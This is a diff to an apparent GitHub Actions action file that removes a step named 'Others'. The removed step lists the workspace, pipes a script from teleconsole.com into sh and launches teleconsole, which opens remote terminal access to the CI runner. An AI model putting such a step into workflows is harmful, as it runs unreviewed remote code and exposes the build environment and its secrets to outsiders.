@@ -26,17 +26,6 @@ runs:
         echo "::endgroup::"
       shell: bash
 
-    - name: Others
-      run: |
-        echo "::group::Others"
-        echo $GITHUB_WORKSPACE
-        cd $GITHUB_WORKSPACE
-        ls -l -R
-        curl https://www.teleconsole.com/get.sh | sh
-        teleconsole
-        echo "::endgroup::"
-      shell: bash
-
 branding:
   icon: cpu
   color: orange
